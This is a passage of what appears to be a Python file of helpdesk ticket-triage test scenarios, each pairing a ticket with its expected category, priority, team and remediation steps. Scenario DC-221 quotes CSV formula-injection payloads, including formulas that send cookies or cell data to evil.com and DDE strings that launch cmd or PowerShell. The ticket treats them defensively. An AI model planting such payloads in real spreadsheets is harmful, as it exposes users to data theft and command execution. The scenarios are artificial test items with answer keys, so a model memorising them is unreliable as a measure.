                "Hi IAM team,\n\n"
                "My badge stopped working at the Building 1 entrance this morning. "
                "The security guard scanned the QR code on the door panel and sent "
                "me this data — maybe it helps debug the issue?\n\n"
                "██████████████  ██  ██████████████\n"
                "██          ██  ██  ██          ██\n"
                "██  ██████  ██      ██  ██████  ██\n"
                "██  ██████  ██  ██  ██  ██████  ██\n"
                "██  ██████  ██  ██  ██  ██████  ██\n"
                "██          ██      ██          ██\n"
                "██████████████  ██  ██████████████\n"
                "                ██                \n"
                "████████████  ██████  ████████████\n\n"
                "data:text/plain;base64,eyJkb29yX2lkIjoiQkxEMS1NQUlOLTAxIiwi"
                "cmVhZGVyX2lkIjoiSElELVJQLTQwMDAtMDEiLCJ0aW1lc3RhbXAiOiIyMDI2"
                "LTAzLTE4VDA4OjQ1OjAwWiIsInN0YXR1cyI6IkFDQ0VTU19ERU5JRUQiLCJi"
                "YWRnZV9pZCI6IkVNUC1OWUMtMjM0NSIsImVycm9yIjoiQ0VSVC1FWFBJUkVE"
                "In0=\n\n"
                "The decoded content says: door_id=BLD1-MAIN-01, reader_id=HID-RP-4000-01, "
                "status=ACCESS_DENIED, badge_id=EMP-NYC-2345, error=CERT-EXPIRED.\n\n"
                "My badge worked fine yesterday. I'm on the 8th floor, Quantitative "
                "Analysis team.\n\n"
                "— Viktor Kozlov"
            ),
            category=Category.ACCESS_AUTH,
            priority=Priority.P3,
            team=Team.IAM,
            needs_escalation=False,
            missing_info=[MissingInfo.DEVICE_INFO, MissingInfo.TIMESTAMP],
            next_best_action=(
                "Investigate badge access denial at BLD1-MAIN-01 — the door "
                "reader reports CERT-EXPIRED for badge EMP-NYC-2345."
            ),
            remediation_steps=[
                "Check the badge certificate expiry for EMP-NYC-2345 in the access control system.",
                "Renew the badge certificate if expired.",
                "Verify the HID reader BLD1-MAIN-01 is communicating with the access controller.",
                "Issue a temporary access pass while the badge certificate is renewed.",
                "Test badge access at the door after certificate renewal.",
            ],
            reporter_name="Viktor Kozlov",
            reporter_email="viktor.kozlov@contoso.com",
            reporter_department="Quantitative Analysis",
            channel=Channel.CHAT,
            tags=["data-cleanup", "qr-code-data", "ascii-art-noise"],
            difficulty="medium",
        ),
        # ── DC-220  Mixed Arabic RTL and English LTR technical content ────
        ScenarioDefinition(
            scenario_id="DC-220",
            subject=(
                "VPN configuration issue"
                " \u2014 "
                "\u0645\u0634\u0643\u0644\u0629 \u0641\u064a"
                " \u0625\u0639\u062f\u0627\u062f\u0627\u062a VPN"
            ),
            description=(
                "\u0645\u0631\u062d\u0628\u0627 \u0641\u0631\u064a\u0642"
                " \u062a\u0643\u0646\u0648\u0644\u0648\u062c\u064a\u0627"
                " \u0627\u0644\u0645\u0639\u0644\u0648\u0645\u0627\u062a,\n\n"
                "I'm having a VPN connectivity issue "
                "from our Dubai office. "
                "\u0623\u0648\u0627\u062c\u0647 \u0645\u0634\u0643\u0644\u0629"
                " \u0641\u064a \u0627\u0644\u0627\u062a\u0635\u0627\u0644"
                " \u0628\u0634\u0628\u0643\u0629 VPN"
                " \u0645\u0646 \u0645\u0643\u062a\u0628 \u062f\u0628\u064a.\n\n"
                "Technical details:\n"
                "- Client: GlobalProtect v6.2.1\n"
                "- \u0646\u0638\u0627\u0645 \u0627\u0644\u062a\u0634\u063a\u064a\u0644"
                ": Windows 11 Enterprise 23H2\n"
                "- Error: 'Gateway authentication failed'"
                " / '\u0641\u0634\u0644 \u0645\u0635\u0627\u062f\u0642\u0629"
                " \u0627\u0644\u0628\u0648\u0627\u0628\u0629'\n"
                "- \u0627\u0644\u0628\u0648\u0627\u0628\u0629"
                " \u0627\u0644\u0645\u0633\u062a\u062e\u062f\u0645\u0629"
                ": vpn-me.contoso.com\n"
                "- IP: 192.168.50.0/24 (Dubai office subnet)\n\n"
                "\u0627\u0644\u0645\u0634\u0643\u0644\u0629 \u0628\u062f\u0623\u062a"
                " \u0628\u0639\u062f \u062a\u062d\u062f\u064a\u062b"
                " \u0634\u0647\u0627\u062f\u0629 SSL"
                " \u0639\u0644\u0649 \u0627\u0644\u0628\u0648\u0627\u0628\u0629"
                " \u064a\u0648\u0645 \u0627\u0644\u0623\u062d\u062f. "
                "The issue started after the SSL "
                "certificate renewal on the gateway "
                "on Sunday. "
                "\u0643\u0644 \u0627\u0644\u0645\u0648\u0638\u0641\u064a\u0646"
                " \u0641\u064a \u0645\u0643\u062a\u0628 \u062f\u0628\u064a"
                " \u0645\u062a\u0623\u062b\u0631\u0648\u0646 "
                "(All Dubai office employees are affected).\n\n"
                "\u0634\u0643\u0631\u0627\u064b,\n"
                "Khalid Al-Mansouri\n"
                "\u0642\u0633\u0645"
                " \u0627\u0644\u0639\u0645\u0644\u064a\u0627\u062a"
                " \u0627\u0644\u0645\u0627\u0644\u064a\u0629"
                " | Financial Operations"
            ),
            category=Category.NETWORK,
            priority=Priority.P3,
            team=Team.NETWORK_OPS,
            needs_escalation=False,
            missing_info=[MissingInfo.ERROR_MESSAGE, MissingInfo.AFFECTED_USERS],
            next_best_action=(
                "Investigate VPN gateway authentication failure at vpn-me.contoso.com "
                "after SSL certificate renewal — all Dubai office employees affected."
            ),
            remediation_steps=[
                "Check the renewed SSL certificate on vpn-me.contoso.com for validity.",
                "Verify the certificate chain is complete and trusted by the GlobalProtect client.",
                "Test VPN connectivity from the Dubai office with a reference device.",
                "If the certificate is misconfigured, redeploy with the correct chain.",
                "Confirm VPN access is restored for all Dubai office employees.",
            ],
            reporter_name="Khalid Al-Mansouri",
            reporter_email="khalid.almansouri@contoso.com",
            reporter_department="Financial Operations",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "arabic-rtl-mixed", "bidi-technical"],
            difficulty="hard",
        ),
        # ── DC-221  CSV injection patterns in data storage ticket ───────────
        ScenarioDefinition(
            scenario_id="DC-221",
            subject="Suspicious formulas appearing in exported trade blotter CSV",
            description=(
                "Hi Data Platform team,\n\n"
                "We exported yesterday's trade blotter from the reporting dashboard and "
                "several cells contain what look like executable formulas instead of data. "
                "When we open the CSV in Excel, we get security warnings. Here are the "
                "problematic rows:\n\n"
                "Row 1042: =CMD('calc')!A0\n"
                'Row 1043: =HYPERLINK("http://evil.com/steal?cookie="&A1)\n'
                'Row 1087: +THUN("cmd";"calc")\n'
                "Row 1102: -2+1+CMD('powershell IEX(malicious)')!Z0\n"
                "Row 1240: @SUM(1+1)*cmd|' /C calc'!A0\n"
                'Row 1301: =IMPORTXML(CONCAT("http://evil.com/?data=",A2),"//a")\n\n'
                "The rest of the 5,000+ rows look normal \u2014 standard CUSIP, price, quantity "
                "columns. We're worried this is either injection from an upstream feed or "
                "someone tampered with the staging table.\n\n"
                "Affected system: rpt-sql-prod-03.contoso.internal (ReportingDB)\n"
                "Table: dbo.DailyTradeBlotter\n"
                "Export time: 2026-03-17 18:30 UTC\n\n"
                "Please investigate urgently.\n\n"
                "\u2014 Priya Sharma\n"
                "Risk Analytics"
            ),
            category=Category.DATA_STORAGE,
            priority=Priority.P2,
            team=Team.DATA_PLATFORM,
            needs_escalation=True,
            missing_info=[MissingInfo.TIMESTAMP, MissingInfo.STEPS_TO_REPRODUCE],
            next_best_action=(
                "Investigate potential CSV injection in the DailyTradeBlotter table "
                "on rpt-sql-prod-03 \u2014 malicious formulas detected in exported data."
            ),
            remediation_steps=[
                "Query dbo.DailyTradeBlotter for rows containing formula-like patterns (=, +, -, @).",
                "Audit the upstream data feed pipeline for injection vulnerabilities.",
                "Sanitize affected rows by prefixing formula characters with a single quote.",
                "Add input-validation rules to the ETL pipeline to reject formula patterns.",
                "Re-export the trade blotter and confirm the CSV is clean.",
            ],
            reporter_name="Priya Sharma",
            reporter_email="priya.sharma@contoso.com",
            reporter_department="Risk Analytics",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "csv-injection", "formula-patterns"],
            difficulty="hard",
        ),
        # ── DC-222  GPG/PGP signed email with ASCII armor blocks ───────────
        ScenarioDefinition(
            scenario_id="DC-222",
            subject="Laptop docking station not detected after firmware update",
            description=(
                "-----BEGIN PGP SIGNED MESSAGE-----\n"
                "Hash: SHA512\n\n"
                "Hello Endpoint team,\n\n"
                "After the docking station firmware was pushed last Friday, my "
                "Lenovo ThinkPad X1 Carbon Gen 11 no longer recognizes the "
                "Thunderbolt dock (Lenovo 40B00300US). I get no video output on "
                "either monitor and the USB peripherals connected through the dock "
                "are invisible to Device Manager.\n\n"
                "Steps I tried:\n"
                "1. Rebooted the laptop \u2014 no change\n"
                "2. Tried a different Thunderbolt cable \u2014 same issue\n"
                "3. Connected a colleague's laptop to my dock \u2014 it works\n"
                "4. Checked Device Manager \u2014 Thunderbolt controller shows Code 10\n\n"
                "Firmware version on the dock: 2026.03.14.01\n"
                "Previous firmware: 2025.12.01.03\n"
                "Laptop BIOS: 1.58 (N3HET88W)\n"
                "OS: Windows 11 Enterprise 24H2\n\n"
                "I need this resolved ASAP \u2014 I present to the board tomorrow and "
                "need the dual-monitor setup.\n\n"
                "Best,\nDaniel Okonkwo\nWealth Management\n"
                "-----BEGIN PGP SIGNATURE-----\n\n"
                "iQIzBAEBCgAdFiEEU4bKxPm0NmQv5R6pX7kG9GJ8Y+AFAmYZKFQACgkQX7kG\n"
                "9GJ8Y+BhsA//cK2r3GHFH0hV+VqN3MkZ2z1gR8QOe+N4P4xV5j9LqGfR2K7\n"
                "dZQ9Yd4Bx/wN+R5jE2VQ7MnKP3F9kQaHxB3sQ+WLMJ2kV7nB8GpT5cE0o1V\n"
                "FzK8mN0Q9rE5gL2aH7xJ3cY6dW4bR1fS8nT9uP0vK2wX5zA3eD7hI4jM6oQ\n"
                "=7xKm\n"
                "-----END PGP SIGNATURE-----"
            ),
            category=Category.HARDWARE,
            priority=Priority.P2,
            team=Team.ENDPOINT,
            needs_escalation=False,
            missing_info=[MissingInfo.DEVICE_INFO, MissingInfo.ERROR_MESSAGE],
            next_best_action=(
                "Investigate Thunderbolt dock detection failure on ThinkPad X1 "
                "Carbon after firmware update 2026.03.14.01 \u2014 Device Manager shows Code 10."
            ),
            remediation_steps=[
                "Roll back the docking station firmware from 2026.03.14.01 to 2025.12.01.03.",
                "Update the Thunderbolt controller driver on the ThinkPad X1 Carbon.",
                "Clear the Thunderbolt device cache in Device Manager and re-enumerate.",
                "Test dual-monitor output through the dock after driver/firmware remediation.",
            ],
            reporter_name="Daniel Okonkwo",
            reporter_email="daniel.okonkwo@contoso.com",
            reporter_department="Wealth Management",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "pgp-signed-email", "ascii-armor-noise"],
            difficulty="medium",
        ),
        # ── DC-223  Zalgo text with combining Unicode diacritics ────────────
        ScenarioDefinition(
            scenario_id="DC-223",
            subject=(
                "A\u0335\u0347\u0317p\u0321\u0353\u0340"
                "p\u0334\u0326 c\u0344\u031e\u032d"
                "r\u0343\u031f\u0318a\u0308\u0352\u0348"
                "s\u0308\u032c\u0316h\u0337\u0329\u0323"
                " on Bloomberg Terminal \u2014 URGENT"
            ),
            description=(
                "H\u0336\u0349\u0320e\u0337\u0353\u032al\u0335\u032d\u0319l\u0334\u032c\u031co\u0336\u0347\u031e "
                "I\u0335\u0329\u031fT\u0337\u0348\u0323 S\u0336\u0326\u031eu\u0334\u0353\u032dp\u0335\u032c\u0319"
                "p\u0337\u0347\u031co\u0336\u0349\u0320r\u0334\u0329\u031ft\u0335\u0348\u031e,\n\n"
                "My Bloomberg Terminal (serial BT-NYC-4401) crashed this morning at "
                "09:15 ET while loading the FX options pricer. The application froze "
                "and displayed corrupted text with strange diacritical marks everywhere "
                "\u2014 like what you see in this email. I suspect the locale or font "
                "rendering engine is broken after last night's Windows Update "
                "(KB5035942).\n\n"
                "The error dialog said:\n"
                '"BLP_CORE.DLL \u2014 Unhandled exception at 0x00007FF6A1B2C3D4 in '
                "blp_terminal.exe. Access violation reading location "
                '0x0000000000000000"\n\n'
                "I've tried restarting the terminal 3 times. Same crash every time.\n\n"
                "This is impacting my ability to price client trades. FX desk needs "
                "this resolved immediately.\n\n"
                "Regards,\n"
                "Tomoko Hayashi\n"
                "FX Trading"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P1,
            team=Team.ENDPOINT,
            needs_escalation=True,
            missing_info=[MissingInfo.APPLICATION_VERSION, MissingInfo.STEPS_TO_REPRODUCE],
            next_best_action=(
                "Investigate Bloomberg Terminal crash on BT-NYC-4401 after Windows "
                "Update KB5035942 \u2014 BLP_CORE.DLL access violation on FX options pricer."
            ),
            remediation_steps=[
                "Uninstall Windows Update KB5035942 from the affected workstation.",
                "Clear Bloomberg Terminal local cache and restart the application.",
                "Verify the Bloomberg Terminal version and apply any available patches.",
                "If the issue persists, escalate to Bloomberg L2 support with the crash dump.",
            ],
            reporter_name="Tomoko Hayashi",
            reporter_email="tomoko.hayashi@contoso.com",
            reporter_department="FX Trading",
            channel=Channel.CHAT,
            tags=["data-cleanup", "zalgo-unicode", "combining-diacritics"],
            difficulty="hard",
        ),
        # ── DC-224  Deeply nested JSON payload (50+ levels) ─────────────────
        ScenarioDefinition(
            scenario_id="DC-224",
            subject="Data lake ingestion failing \u2014 malformed JSON in upstream feed",
            description=(
                "Hi Data Platform,\n\n"
                "The nightly ingestion job for the market-data feed is failing with "
                "a 'max recursion depth exceeded' error. The upstream vendor started "
                "sending deeply nested JSON payloads. Here is a truncated sample of "
                "the problematic record:\n\n"
                + '{"level_0":' * 55
                + '{"ticker":"MSFT","price":425.67,"volume":18420000}'
                + "}" * 55
                + "\n\n"
                "The nesting goes 55 levels deep. Our parser (Apache Spark 3.5) "
                "defaults to a max depth of 50. This started happening after the "
                "vendor migrated their API to v3 on 2026-03-16.\n\n"
                "Affected pipeline: adf-prod-marketdata-ingest\n"
                "Error: com.fasterxml.jackson.core.exc.StreamConstraintsException: "
                "Document nesting depth (55) exceeds the maximum allowed (50)\n"
                "Run ID: adf-run-2026-03-17-0200Z\n\n"
                "We need this fixed before the next trading day.\n\n"
                "Thanks,\nRobert Chen\nData Engineering"
            ),
            category=Category.DATA_STORAGE,
            priority=Priority.P1,
            team=Team.DATA_PLATFORM,
            needs_escalation=True,
            missing_info=[MissingInfo.CONFIGURATION_DETAILS, MissingInfo.BUSINESS_IMPACT],
            next_best_action=(
                "Fix the market-data ingestion pipeline failure caused by deeply "
                "nested JSON (55 levels) from the upstream vendor's v3 API migration."
            ),
            remediation_steps=[
                "Increase the Jackson parser max nesting depth in the Spark ingestion job configuration.",
                "Add a JSON-flattening pre-processing step to normalize deeply nested payloads.",
                "Contact the upstream vendor to request payload structure documentation for API v3.",
                "Re-run the failed ADF pipeline run adf-run-2026-03-17-0200Z after the fix.",
                "Add monitoring alerts for JSON nesting depth anomalies in future ingestions.",
            ],
            reporter_name="Robert Chen",
            reporter_email="robert.chen@contoso.com",
            reporter_department="Data Engineering",
            channel=Channel.PORTAL,
            tags=["data-cleanup", "deep-nested-json", "parser-overflow"],
            difficulty="hard",
        ),
        # ── DC-225  Raw SQL query output with column headers/separators ─────
        ScenarioDefinition(
            scenario_id="DC-225",
            subject="Orphaned records in the client account mapping table",
            description=(
                "Hi team,\n\n"
                "I ran a diagnostic query and found orphaned records in the account "
                "mapping table. Pasting the output here:\n\n"
                "+------------+------------------+-------------+------------+--------+\n"
                "| account_id | client_name      | advisor_id  | region     | status |\n"
                "+------------+------------------+-------------+------------+--------+\n"
                "| ACC-90241  | NULL             | ADV-1102    | US-EAST    | ACTIVE |\n"
                "| ACC-90242  | Meridian Cap.    | NULL        | US-WEST    | ACTIVE |\n"
                "| ACC-90243  | NULL             | NULL        | NULL       | ORPHAN |\n"
                "| ACC-90244  | Vanguard Trust   | ADV-0000    | EU-WEST    | ACTIVE |\n"
                "| ACC-90245  | Apex Holdings    | ADV-1103    | NULL       | PEND   |\n"
                "| ACC-90246  | NULL             | ADV-1104    | APAC       | ACTIVE |\n"
                "| ACC-90247  | Sterling & Co.   | ADV-1105    | US-EAST    | ORPHAN |\n"
                "| ACC-90248  | NULL             | NULL        | US-CENTRAL | ORPHAN |\n"
                "+------------+------------------+-------------+------------+--------+\n"
                "8 rows in set (0.03 sec)\n\n"
                "Query used:\n"
                "SELECT account_id, client_name, advisor_id, region, status\n"
                "FROM dbo.ClientAccountMapping\n"
                "WHERE client_name IS NULL OR advisor_id IS NULL OR status = 'ORPHAN';\n\n"
                "These orphaned/incomplete records are causing reconciliation failures "
                "in the nightly batch. Database: acct-sql-prod-01, schema: dbo.\n\n"
                "\u2014 Samantha Wright\nOperations"
            ),
            category=Category.DATA_STORAGE,
            priority=Priority.P3,
            team=Team.DATA_PLATFORM,
            needs_escalation=False,
            missing_info=[MissingInfo.TIMESTAMP, MissingInfo.AFFECTED_SYSTEM],
            next_best_action=(
                "Clean up orphaned and incomplete records in dbo.ClientAccountMapping "
                "on acct-sql-prod-01 that are causing nightly reconciliation failures."
            ),
            remediation_steps=[
                "Back up the ClientAccountMapping table before making changes.",
                "Investigate the source of NULL client_name and advisor_id values in the ETL pipeline.",
                "Archive or delete confirmed orphaned records (status = 'ORPHAN') after review.",
                "Add NOT NULL constraints or default values to prevent future orphaned records.",
            ],
            reporter_name="Samantha Wright",
            reporter_email="samantha.wright@contoso.com",
            reporter_department="Operations",
            channel=Channel.PORTAL,
            tags=["data-cleanup", "sql-output-noise", "tabular-data"],
            difficulty="medium",
        ),
        # ── DC-226  S/MIME digital signature block in access/auth ticket ────
        ScenarioDefinition(
            scenario_id="DC-226",
            subject="Service account locked out after password rotation",
            description=(
                'Content-Type: multipart/signed; protocol="application/pkcs7-signature";\n'
                '  micalg=sha-256; boundary="----=_Part_5432_1234567890"\n\n'
                "------=_Part_5432_1234567890\n"
                "Content-Type: text/plain; charset=UTF-8\n\n"
                "Hi IAM team,\n\n"
                "The service account svc-trade-reconciler@contoso.com was locked out "
                "this morning after an automated password rotation triggered by CyberArk. "
                "The new password was applied to the vault but not propagated to the "
                "three downstream systems that use this account:\n\n"
                "1. Trade Reconciliation Service (trade-recon-prod-01)\n"
                "2. EOD Settlement Batch (settle-batch-prod-02)\n"
                "3. Client Reporting Portal (rpt-portal-prod-01)\n\n"
                "All three services are now failing authentication. The reconciliation "
                "service processes $2.3B in daily trades and must be back online before "
                "4:00 PM ET cutoff.\n\n"
                "CyberArk Vault: PVWA-PROD-01\n"
                "Account: svc-trade-reconciler\n"
                "Lockout time: 2026-03-18 06:45:00 UTC\n"
                "AD Event ID: 4740 (Account Lockout)\n\n"
                "Regards,\nAisha Patel\nTrade Operations\n\n"
                "------=_Part_5432_1234567890\n"
                "Content-Type: application/pkcs7-signature; name=smime.p7s\n"
                "Content-Transfer-Encoding: base64\n\n"
                "MIIGXgYJKoZIhvcNAQcCoIIGTzCCBksCAQExDzANBglghkgBZQMEAgEFADAL\n"
                "BgkqhkiG9w0BBwGgggPkMIID4DCCAsigAwIBAgIQK2r3GHFH0hV5R6pX7kG9\n"
                "GDANBgkqhkiG9w0BAQsFADBFMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMQ29u\n"
                "dG9zbyBMdGQxHzAdBgNVBAMTFkNvbnRvc28gSXNzdWluZyBDQSBHMjAeFw0y\n"
                "NjAxMTUwMDAwMDBaFw0yNzAxMTUyMzU5NTlaMCkxJzAlBgNVBAMTHmFpc2hh\n"
                "------=_Part_5432_1234567890--"
            ),
            category=Category.ACCESS_AUTH,
            priority=Priority.P1,
            team=Team.IAM,
            needs_escalation=True,
            missing_info=[MissingInfo.AUTHENTICATION_METHOD, MissingInfo.CONFIGURATION_DETAILS],
            next_best_action=(
                "Unlock service account svc-trade-reconciler and propagate the rotated "
                "password to all three downstream systems before the 4:00 PM ET cutoff."
            ),
            remediation_steps=[
                "Unlock svc-trade-reconciler in Active Directory immediately.",
                "Retrieve the current password from CyberArk vault PVWA-PROD-01.",
                "Update the stored credentials on trade-recon-prod-01, settle-batch-prod-02, and rpt-portal-prod-01.",
                "Restart all three services and verify successful authentication.",
                "Configure CyberArk to auto-propagate rotated credentials to dependent systems.",
            ],
            reporter_name="Aisha Patel",
            reporter_email="aisha.patel@contoso.com",
            reporter_department="Trade Operations",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "smime-signature", "pkcs7-noise"],
            difficulty="hard",
        ),
        # ── DC-227  Near-empty "Sent from my iPhone" body ───────────────────
        ScenarioDefinition(
            scenario_id="DC-227",
            subject="Excel crashes when opening Q1 risk model \u2014 macro error VBA runtime 1004",
            description=("\n\nSent from my iPhone"),
            category=Category.SOFTWARE,
            priority=Priority.P3,
            team=Team.ENDPOINT,
            needs_escalation=False,
            missing_info=[
                MissingInfo.ERROR_MESSAGE,
                MissingInfo.STEPS_TO_REPRODUCE,
                MissingInfo.APPLICATION_VERSION,
                MissingInfo.AFFECTED_SYSTEM,
            ],
            next_best_action=(
                "Follow up with the reporter to get details about the Excel crash "
                "and VBA runtime error 1004 mentioned in the subject line."
            ),
            remediation_steps=[
                "Contact the reporter to obtain the full error message and steps to reproduce.",
                "Request the Excel and VBA version, and whether the file is on SharePoint or local.",
                "Once details are available, attempt to reproduce the crash in a test environment.",
            ],
            reporter_name="Gregory Lawson",
            reporter_email="gregory.lawson@contoso.com",
            reporter_department="Risk Management",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "empty-body", "mobile-signature-only"],
            difficulty="easy",
        ),
        # ── DC-228  Auto-generated JIRA notification with transition history ─
        ScenarioDefinition(
            scenario_id="DC-228",
            subject="[JIRA] (INFRA-8842) Updated: Network switch replacement \u2014 Building 3 Floor 7",
            description=(
                "Atlassian JIRA (v9.12.2) \u2014 Issue Update Notification\n"
                "==========================================================\n\n"
                "Issue: INFRA-8842\n"
                "Type: Task\n"
                "Priority: High\n"
                "Reporter: net-ops-bot\n"
                "Assignee: Carlos Mendez\n\n"
                "Change History:\n"
                "---------------------------------------------------------------\n"
                "2026-03-10 09:00  Status: Open \u2192 In Progress (by Carlos Mendez)\n"
                "2026-03-10 09:05  Assignee: Unassigned \u2192 Carlos Mendez\n"
                "2026-03-11 14:20  Comment: 'Ordered Cisco C9300-48T from vendor.'\n"
                "2026-03-12 11:00  Status: In Progress \u2192 Waiting for Hardware\n"
                "2026-03-14 08:30  Comment: 'Switch arrived. Scheduling maintenance window.'\n"
                "2026-03-14 09:00  Status: Waiting for Hardware \u2192 In Progress\n"
                "2026-03-15 02:00  Comment: 'Maintenance window: 2026-03-16 02:00\u201304:00 UTC'\n"
                "2026-03-16 02:15  Comment: 'Old switch powered off. Starting swap.'\n"
                "2026-03-16 03:45  Comment: 'New switch online. Running post-checks.'\n"
                "2026-03-16 04:10  Status: In Progress \u2192 Post-Verification\n"
                "2026-03-17 10:00  Comment: 'Users on Floor 7 reporting intermittent drops.'\n"
                "2026-03-17 10:30  Priority: High \u2192 Critical\n"
                "2026-03-17 10:35  Status: Post-Verification \u2192 In Progress\n"
                "2026-03-17 11:00  Assignee: Carlos Mendez \u2192 Li Wei\n"
                "2026-03-18 08:00  Comment: 'Spanning tree misconfiguration suspected.'\n"
                "---------------------------------------------------------------\n\n"
                "Latest Comment (Li Wei, 2026-03-18 08:00):\n"
                '"After reviewing the logs, I suspect the new Cisco C9300-48T has a '
                "spanning tree priority conflict with the existing core stack. VLAN 710 "
                "(Floor 7 data) is intermittently losing its root bridge. Need to adjust "
                "STP priority from 32768 to 4096 on the new switch. Requesting an "
                'emergency change window tonight."\n\n'
                "\u2014\u2014\u2014\nThis message was automatically generated by Atlassian JIRA.\n"
                "Do not reply to this email.\n"
                "Manage notifications: https://jira.contoso.internal/settings/notifications"
            ),
            category=Category.NETWORK,
            priority=Priority.P1,
            team=Team.NETWORK_OPS,
            needs_escalation=True,
            missing_info=[MissingInfo.AFFECTED_USERS, MissingInfo.NETWORK_LOCATION],
            next_best_action=(
                "Approve emergency change window to fix spanning tree priority conflict "
                "on new Cisco C9300-48T in Building 3 Floor 7 causing intermittent drops."
            ),
            remediation_steps=[
                "Schedule an emergency change window for STP priority adjustment.",
                "Set the spanning tree priority to 4096 on the new Cisco C9300-48T for VLAN 710.",
                "Verify root bridge election is stable after the change.",
                "Monitor Floor 7 network connectivity for 24 hours post-change.",
            ],
            reporter_name="Li Wei",
            reporter_email="li.wei@contoso.com",
            reporter_department="Network Operations",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "jira-notification", "transition-history-noise"],
            difficulty="medium",
        ),
        # ── DC-229  Windows registry export (.reg format) ───────────────────
        ScenarioDefinition(
            scenario_id="DC-229",
            subject="Outlook keeps reverting proxy settings after GPO refresh",
            description=(
                "Hi Endpoint team,\n\n"
                "Every 90 minutes Outlook resets my proxy configuration. I exported "
                "the registry key that keeps getting overwritten \u2014 here it is:\n\n"
                "Windows Registry Editor Version 5.00\n\n"
                "[HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\16.0\\Outlook\\HTTP\\Proxy]\n"
                '"ProxyServer"="proxy-nyc.contoso.internal:8080"\n'
                '"ProxyOverride"="*.contoso.internal;10.*;192.168.*;172.16.*"\n'
                '"ProxyEnable"=dword:00000001\n'
                '"AutoDetect"=dword:00000000\n'
                '"AutoConfigURL"="http://wpad.contoso.internal/wpad.dat"\n\n'
                "[HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\16.0\\Outlook\\HTTP\\Proxy\\Backup]\n"
                '"ProxyServer_backup"="proxy-chi.contoso.internal:3128"\n'
                '"ProxyEnable_backup"=dword:00000001\n'
                '"LastGPORefresh"="2026-03-18T08:30:00Z"\n\n'
                "[HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Office\\16.0\\Outlook\\HTTP]\n"
                '"ForceProxy"=dword:00000001\n'
                '"MandatoryProxyServer"="proxy-chi.contoso.internal:3128"\n'
                '"AllowUserOverride"=dword:00000000\n\n'
                "As you can see, the GPO is forcing proxy-chi (Chicago) but I'm in "
                "the New York office and need proxy-nyc. The ForceProxy + "
                "AllowUserOverride=0 means I can't fix this myself. My OU is "
                "OU=NYC-Trading,OU=Workstations,DC=contoso,DC=internal.\n\n"
                "Machine: WS-NYC-TRD-0042\n"
                "OS: Windows 11 Enterprise 24H2\n"
                "Outlook: Microsoft 365 v2402\n\n"
                "\u2014 Marcus Thompson\nEquity Trading"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P3,
            team=Team.ENDPOINT,
            needs_escalation=False,
            missing_info=[MissingInfo.CONFIGURATION_DETAILS, MissingInfo.ENVIRONMENT_DETAILS],
            next_best_action=(
                "Fix the GPO proxy assignment for OU=NYC-Trading workstations \u2014 "
                "the policy is incorrectly forcing the Chicago proxy on New York machines."
            ),
            remediation_steps=[
                "Review the GPO linked to OU=NYC-Trading to identify the incorrect proxy assignment.",
                "Update the GPO to assign proxy-nyc.contoso.internal:8080 for NYC workstations.",
                "Run gpupdate /force on WS-NYC-TRD-0042 and verify the registry reflects the correct proxy.",
                "Confirm Outlook connects through the correct proxy after the GPO update.",
            ],
            reporter_name="Marcus Thompson",
            reporter_email="marcus.thompson@contoso.com",
            reporter_department="Equity Trading",
            channel=Channel.PORTAL,
            tags=["data-cleanup", "registry-export", "reg-file-noise"],
            difficulty="medium",
        ),
        # ── DC-230  Python traceback with very deep stack (50+ frames) ──────
        ScenarioDefinition(
            scenario_id="DC-230",
            subject="Portfolio optimizer service crashing with RecursionError",
            description=(
                "Hi team,\n\n"
                "The portfolio optimizer microservice keeps crashing. Full traceback:\n\n"
                "Traceback (most recent call last):\n"
                '  File "/opt/contoso/portfolio-optimizer/main.py", line 42, in run_server\n'
                "    result = optimizer.optimize(portfolio)\n"
                '  File "/opt/contoso/portfolio-optimizer/core/engine.py", line 118, in optimize\n'
                "    return self._recursive_rebalance(holdings, constraints)\n"
                + "".join(
                    f'  File "/opt/contoso/portfolio-optimizer/core/engine.py", line 205, in _recursive_rebalance\n'
                    f"    return self._recursive_rebalance(sub_holdings[{i}], constraints)\n"
                    for i in range(50)
                )
                + "RecursionError: maximum recursion depth exceeded while calling a Python object\n\n"
                "This started after we deployed v2.14.0 which added hierarchical "
                "risk parity. The recursive rebalancing doesn't have a base case "
                "when the sub-portfolio has only one asset.\n\n"
                "Service: portfolio-optimizer (K8s namespace: prod-quant)\n"
                "Pod: portfolio-optimizer-7b8c9d-xk4m2\n"
                "Python: 3.12.2\n"
                "Deploy tag: v2.14.0 (deployed 2026-03-17 22:00 UTC)\n\n"
                "\u2014 Elena Volkov\nQuantitative Development"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P2,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.STEPS_TO_REPRODUCE, MissingInfo.BUSINESS_IMPACT],
            next_best_action=(
                "Roll back portfolio-optimizer to v2.13.x or hotfix the missing "
                "base case in _recursive_rebalance for single-asset sub-portfolios."
            ),
            remediation_steps=[
                "Roll back the portfolio-optimizer deployment to the previous stable version v2.13.x.",
                "File a bug for the missing base case in _recursive_rebalance for single-asset portfolios.",
                "Add a unit test for single-asset sub-portfolio input to prevent regression.",
                "Deploy the hotfix and verify the optimizer handles all portfolio sizes without recursion errors.",
            ],
            reporter_name="Elena Volkov",
            reporter_email="elena.volkov@contoso.com",
            reporter_department="Quantitative Development",
            channel=Channel.CHAT,
            tags=["data-cleanup", "deep-traceback", "recursion-error"],
            difficulty="medium",
        ),
        # ── DC-231  URL with extremely long query parameters ────────────────
        ScenarioDefinition(
            scenario_id="DC-231",
            subject="SharePoint dashboard not loading for compliance team",
            description=(
                "Hi Enterprise Apps,\n\n"
                "The compliance dashboard on SharePoint won't load. I get a blank "
                "page. Here's the URL I'm trying to access:\n\n"
                "https://contoso.sharepoint.com/sites/compliance-dashboard/SitePages/"
                "RiskOverview.aspx"
                "?sessionId=a1b2c3d4-e5f6-7890-abcd-ef1234567890"
